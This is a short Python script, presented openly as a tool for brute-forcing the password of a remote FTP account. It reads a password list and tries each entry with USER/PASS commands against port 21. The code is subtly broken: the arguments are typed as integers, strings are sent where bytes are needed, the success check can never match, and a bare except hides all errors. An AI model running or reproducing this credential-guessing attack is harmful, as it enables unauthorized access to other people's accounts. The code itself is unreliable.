#!/usr/bin/python3
import socket
import re
import sys
import argparse
from signal import signal, SIGINT

# Colors
COLORS = {
    'NC': '\033[0m',
    'RED': '\033[1;31m',
    'GREEN': '\033[0;32m',
    'BLUE': '\033[0;34m',
    'YELLOW': '\033[1;33m',
    'LPURPLE': '\033[1;35m'
}

# Replace color by ANSI COLOR CODE
def ColorText(text):
    for color in COLORS:
        text = text.replace('[[' + color + ']]', COLORS[color])
    return text

# Header
header = """[[YELLOW]]
 ##############################################
 ############### BRUTERORCE FTP ###############
 ##############################################

 This Script will help you bruteforce remotely
 a ftp account. By Nzanoa.[[NC]]
 eg. [[LPURPLE]]python3 BruteForceFTP.py[[NC]]
"""

# Handle signal
def handler(signal_received, frame):
    # Handle any cleanup here
    signal_error = "\n [-][[RED]] Exiting gracefully [[NC]]\n"
    print(ColorText(signal_error))
    exit(0)

signal(SIGINT, handler)

# Print Header
print(ColorText(header))

# Set argument
parser = argparse.ArgumentParser(prog=" BruteForceFTP", description=" Brutefore FTP")
parser.add_argument("-f", "--ftp", type=int, metavar='', required=True, help="Enter FTP Server")
parser.add_argument("-u", "--username", type=int, metavar='', required=True, help="Enter Username")
parser.add_argument("-p", "--passfile", type=int, metavar='', required=True, help="Enter Passfile")
args = parser.parse_args()

# Set Connect
def connect(ftp, username, password):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print(" [+][[GREEN]] Trying {} : {}[[NC]]".format(username, password))
	s.connect((ftp, 21))
	data = s.recv(1024)
	s.send('USER {}\r\n'.format(username))
	data = s.recv(1024)
	s.send('PASS {}\r\n'.format(password))
	data = s.recv(3)
	s.send('QUIT\r\n')
	s.close()
	return data

ftp = args.ftp
username = args.username

try:
    count = 0
    passfile = open(args.passfile, 'r')
    for line in passfile.readlines():
    	password = line.strip('\n')
    	attempt = connect(ftp, username, password)
    	print(" [+][[GREEN]] Trying {} : {} [[NC]]".format(username, password))
    	if attempt == "230" :
    		print(" [+][[GREEN]] password is found: {}[[NC]]".format(password))
    		sys.exit(0)
except:
    print(" [-][[RED]] Error occured![[NC]]")
